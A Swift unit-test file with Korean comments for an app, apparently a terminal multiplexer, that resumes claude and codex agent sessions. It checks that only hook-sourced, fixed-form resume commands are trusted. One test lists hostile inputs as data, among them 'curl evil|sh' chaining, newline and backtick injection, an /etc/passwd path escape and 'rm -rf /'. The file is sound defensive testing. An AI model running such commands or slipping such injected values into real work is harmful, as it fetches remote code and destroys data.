import Testing
import Foundation
@testable import muxa

/// 재개 바인딩의 **출처**가 신뢰를 정한다 — 사실(훅)은 자동, 추측(스캔)은 확인.
///
/// 종전엔 정확히 거꾸로였다: 훅이 알려준 session_id(사실)는 매번 사용자가 버튼을 눌러야 했고,
/// cwd 디렉터리에서 mtime이 가장 최근인 jsonl을 고른 것(추측)이 자동 실행됐다. 그래서 다른 claude가
/// 파일을 건드리기만 해도 **엉뚱한 세션을 말없이 이어받을** 수 있었다.
struct ResumeSourceTests {
    @Test func 훅_바인딩은_신뢰된다() {
        let b = ResumeBinding(command: "claude --resume abc", source: .hook)
        #expect(b.trusted)
    }

    @Test func 스캔_바인딩은_신뢰하지_않는다() {
        // cwd로 추측한 것 — 자동 실행 금지, 배너로 사용자에게 확인받는다.
        let b = ResumeBinding(command: "claude --resume abc", source: .scan)
        #expect(!b.trusted)
    }

    @Test func 구_스냅샷의_trusted_true는_스캔으로_읽는다() throws {
        // 옛 trusted=true는 mtime 스캔 결과였다 — 이제 추측으로 강등해 확인을 받는다.
        let json = #"{"command":"claude --resume x","trusted":true}"#
        let b = try JSONDecoder().decode(ResumeBinding.self, from: Data(json.utf8))
        #expect(b.source == .scan)
        #expect(!b.trusted)
    }

    @Test func 구_스냅샷의_trusted_false는_훅으로_읽는다() throws {
        // 옛 trusted=false는 훅이 넘긴 명령이었다 — 사실이므로 신뢰로 승격한다.
        let json = #"{"command":"claude --resume x","trusted":false}"#
        let b = try JSONDecoder().decode(ResumeBinding.self, from: Data(json.utf8))
        #expect(b.source == .hook)
        #expect(b.trusted)
    }

    @Test func 왕복_보존() throws {
        let b = ResumeBinding(command: "codex resume 123", agentLabel: "codex", cwd: "/tmp", source: .hook)
        let data = try JSONEncoder().encode(b)
        let back = try JSONDecoder().decode(ResumeBinding.self, from: data)
        #expect(back == b)
        #expect(back.source == .hook)
    }

    // 줄 프로토콜(외부 입력) 재개 명령의 출처 판정 — muxa가 만드는 고정 꼴만 신뢰한다.
    // 이게 막히지 않으면 소켓에 임의 명령을 실어 승인 게이트를 건너뛰고 셸에 자동 실행시킬 수 있다.

    @Test func 고정꼴_재개명령만_훅으로_신뢰한다() {
        #expect(ResumeBinding.isSafeResumeCommand("claude --resume 550e8400-e29b-41d4-a716-446655440000"))
        #expect(ResumeBinding.isSafeResumeCommand("codex --resume abc-123"))
        #expect(ResumeBinding.hookSource(forExternalCommand: "claude --resume abc-123") == .hook)
    }

    @Test func 임의_셸_명령은_추측으로_강등된다() {
        // 주입 시도·잉여 토큰·경로 이스케이프·개행은 전부 신뢰 불가 → .scan(배너 확인 필수, 자동 실행 안 함).
        let hostile = [
            "claude --resume abc; curl evil|sh",   // 명령 연쇄
            "curl evil.sh|sh",                     // 재개 아님
            "claude --resume abc extra",           // 잉여 토큰
            "claude --dangerously --resume abc",   // 잉여 플래그
            "claude --resume ../../etc/passwd",    // 경로 이스케이프
            "claude --resume a`whoami`",           // 백틱
            "claude --resume a\ncurl evil|sh",     // 개행 주입
            "claude --resume ",                    // 빈 id
            "rm -rf /",
        ]
        for cmd in hostile {
            #expect(!ResumeBinding.isSafeResumeCommand(cmd), "신뢰하면 안 됨: \(cmd)")
            #expect(ResumeBinding.hookSource(forExternalCommand: cmd) == .scan, "강등돼야 함: \(cmd)")
        }
    }
}
